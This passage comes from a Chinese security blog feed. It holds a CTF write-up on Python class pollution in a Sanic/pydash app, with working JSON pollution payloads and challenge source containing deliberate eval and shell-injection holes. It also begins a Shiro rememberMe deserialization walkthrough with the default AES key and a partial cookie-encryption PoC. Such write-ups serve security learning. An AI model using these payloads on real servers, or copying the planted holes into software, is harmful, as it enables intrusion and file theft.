class="line">Session(app)</span><br></pre></td></tr></table></figure><p>这里的app.static创建了一个静态文件路由<code>/static/</code>使得客户端能够访问到.&#x2F;static&#x2F;路径下的静态文件</p><p>我们去方法里面看看</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727221812455.png" alt="image-20240727221812455"></p><p>可以看见这个方法中有很多的参数, 下面还有一大段的注释</p><p>重点关注directory_view 和 directory_handler这两个参数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727221932012.png" alt="image-20240727221932012"></p><p>directory_view 理解起来比较简单, 当它为True时, 访问对应路由时会展示目录下的文件及子目录</p><p>例如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>, directory_view=<span class="literal">True</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727223020832.png" alt="image-20240727223020832"></p><p>正常不加参数directory_view&#x3D;True这里是会返回500错误的</p><p>而directory_handler是一个对象, 它负责处理客户端对目录的请求, 题目中是没有指定directory_handler的, 在app.static方法中, 没有指定directory_handler时, 默认会这样处理</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727223438442.png" alt="image-20240727223438442"></p><p>这里创建了一个Directory_handler, 跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727223806677.png" alt="image-20240727223806677"></p><p>这样看来我们只需要把static创建的这个Directory_handler对象的directory污染为根目录, directory_view污染为True即可</p><p>如何获取到Directory_handler对象?</p><p>首先需要明确一点, 一条路由的handler, 肯定是存在于这个路由的实例的上下文中的, 那么我们首先要得到这个路由的实例</p><p>这里有两种方法来获取全部路由实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.router.name_index</span><br><span class="line">输出:</span><br><span class="line">&#123;&#x27;__mp_main__.static&#x27;: &lt;Route: name=__mp_main__.static path=static/&lt;__file_uri__:path&gt;&gt;, &#x27;__mp_main__.index&#x27;: &lt;Route: name=__mp_main__.index path=/&gt;, &#x27;__mp_main__.login&#x27;: &lt;Route: name=__mp_main__.login path=login&gt;, &#x27;__mp_main__.src&#x27;: &lt;Route: name=__mp_main__.src path=src&gt;, &#x27;__mp_main__.admin&#x27;: &lt;Route: name=__mp_main__.admin path=admin&gt;&#125;</span><br><span class="line"></span><br><span class="line">app.router.routes_all</span><br><span class="line">输出:</span><br><span class="line">&#123;(&#x27;&#x27;,): &lt;Route: name=__mp_main__.index path=/&gt;, (&#x27;login&#x27;,): &lt;Route: name=__mp_main__.login path=login&gt;, (&#x27;src&#x27;,): &lt;Route: name=__mp_main__.src path=src&gt;, (&#x27;admin&#x27;,): &lt;Route: name=__mp_main__.admin path=admin&gt;, (&#x27;static&#x27;, &#x27;&lt;__file_uri__:path&gt;&#x27;): &lt;Route: name=__mp_main__.static path=static/&lt;__file_uri__:path&gt;&gt;&#125;</span><br></pre></td></tr></table></figure><p>他们都是dict类型的, 因此我们可以这样得到路由实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.router.name_index[&#x27;__mp_main__.static&#x27;]</span><br><span class="line"></span><br><span class="line">app.router.routes_all[(&#x27;static&#x27;, &#x27;&lt;__file_uri__:path&gt;&#x27;)]</span><br></pre></td></tr></table></figure><p>接下来如何调用它的DirectoryHandler呢? </p><p>直接全局搜索name_index和routes_all</p><p>这个routes_all实际上是一个函数, 那么就没法用了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728001822973.png" alt="image-20240728001822973"></p><p>name_index有好几处调用, 我们在这里打上断点</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728003504702.png" alt="image-20240728003504702"></p><p>运行就能看见</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728003933038.png" alt="image-20240728003933038"></p><p>这样就确定了DirectoryHandler的位置 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.router.name_index[%27__mp_main__.static%27].handler.keywords[%27directory_handler%27]</span><br></pre></td></tr></table></figure><p>我们用gxn师傅的方法, 修改一下源码方便调试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="built_in">eval</span>(request.args.get(<span class="string">&#x27;nacl&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728162040504.png" alt="image-20240728162040504"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728162049375.png" alt="image-20240728162049375"></p><p>污染directory_view</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>再次查看为true</p><p>接下来是污染Directory_handler对象的directory属性</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728214109204.png" alt="image-20240728214109204"></p><p>需要注意的是这仍然是一个对象而不是一个字符串</p><p>可以看见directory下面有一个parts元组, 它的值与directory这个Path是对应的, 那么我们去看看这个parts做了什么</p><p>回到最开始的stastic函数中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728214444103.png" alt="image-20240728214444103"></p><p>打断点跟进去</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728215020285.png" alt="image-20240728215020285"></p><p>跟进<code>_from_parts</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728220152259.png" alt="image-20240728220152259"></p><p>发现parts是被赋值给了<code>_parts</code>属性, 并且这是一个list, 可以被污染</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728221045713.png" alt="image-20240728221045713"></p><p>那么, 拿着这两个payload污染后访问&#x2F;static&#x2F;就可以看见flag了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728221559984.png" alt="image-20240728221559984"></p><p>之后再污染<code>__file__</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;.__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;/24bcbd0192e591d6ded1_flag&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>访问<code>/src</code>得到flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728222036306.png" alt="image-20240728222036306"></p><h2 id="Sanic’s-revenge"><a href="#Sanic’s-revenge" class="headerlink" title="Sanic’s revenge"></a>Sanic’s revenge</h2><p>题目给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/*****secret********&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    secret=<span class="string">&#x27;**************************&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;can you find my route name ???&quot;</span>+secret)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment"># 生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="comment"># 备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python原型链污染(类污染) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro反序列化</title>
      <link href="/2024/07/25/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/07/25/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>直接克隆p牛的项目</p><p><a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><p>配一下tomcat就可以直接运行了</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>运行项目, 访问<a href="http://localhost:8080/shirodemo_war/login.jsp">http://localhost:8080/shirodemo_war/login.jsp</a></p><p>默认登录为username&#x3D;root&amp;password&#x3D;secret</p><p>勾选RemberMe, 成功登录会返回set-Cookie: rememberMe&#x3D;xxx</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822202613041.png" alt="image-20240822202613041"></p><p>之后的请求就会带着这个cookie</p><p>而这个cookie就是存在反序列化漏洞的地方, 但是它经过了某种加密</p><p>寻找处理cookie的逻辑</p><p>在<code>org.apache.shiro.web.mgt.AbstractRememberMeManager#getRememberedSerializedIdentity</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822232814207.png" alt="image-20240822232814207"></p><p>这里获取Cookie并判断是否等于<code>deleteMe</code>, 如果不是则返回解码后的内容</p><p>寻找调用<code>getRememberedSerializedIdentity</code>的地方</p><p>在<code>org.apache.shiro.web.mgt.AbstractRememberMeManager#getRememberedPrincipals</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822233352367.png" alt="image-20240822233352367"></p><p>关键看这里的<code>onvertBytesToPrincipals</code>方法, 它把bytes转化为principals对象</p><p>跟进去看一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822233511510.png" alt="image-20240822233511510"></p><p>很明显, 先解密, 再反序列化</p><h3 id="解密函数"><a href="#解密函数" class="headerlink" title="解密函数"></a>解密函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看它的<code>getCipherService()</code>获取的是一个什么加密服务</p><p>跟进去是这样</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822234236930.png" alt="image-20240822234236930"></p><p>我们搜索<code>cipherService</code>看他在哪里被赋值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822234321050.png" alt="image-20240822234321050"></p><p>发现再默认构造器对其赋值. 这是一个AES加密服务</p><p>并且后面的<code>getDecryptionCipherKey()</code>获取密钥也不用找了, 在构造器中设置了一个默认的常量key</p><p>点进去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="反序列化函数"><a href="#反序列化函数" class="headerlink" title="反序列化函数"></a>反序列化函数</h3><p>接下来看看它是怎么反序列化的</p><p>点进去deserialize方法是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serializedIdentity)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getSerializer().deserialize(serializedIdentity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是getSerializer(), 同样的, 获得的这个Serializer在构造器中有默认值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">        <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里deserialize是一个接口,那么执行的<code>deserialize</code>方法就是<code>DefaultSerializer</code>类中实现的<code>deserialize</code>方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822235212707.png" alt="image-20240822235212707"></p><p>也是没有任何的防御措施, 理论上只要有依赖, 任何链子就都能打进去了</p><p>加密不太懂, 贴一下大神的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2022/7/13 17:36</span></span><br><span class="line"><span class="comment"># @Author  : Drunkbaby</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: VSCode</span></span><br><span class="line"><span class="comment"># @Blog    ：https://drun1baby.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> email.mime <span class="keyword">import</span> base</span><br><span class="line"><span class="keyword">from</span> pydoc <span class="keyword">import</span> plain</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> mode</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line"> <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"> data = f.read()</span><br><span class="line"> <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line"> BS = AES.block_size</span><br><span class="line"> pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line"> key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line"> mode = AES.MODE_CBC</span><br><span class="line"> iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line"> <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line"> enc_data = base64.b64decode(enc_data)</span><br><span class="line"> unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line"> key = <span class="string">&quot; &quot;</span></span><br><span class="line"> mode = AES.MODE_CBC</span><br><span class="line"> iv = enc_data[:<span class="number">16</span>]</span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"> plaintext = encryptor.decrypt(enc_data[<span 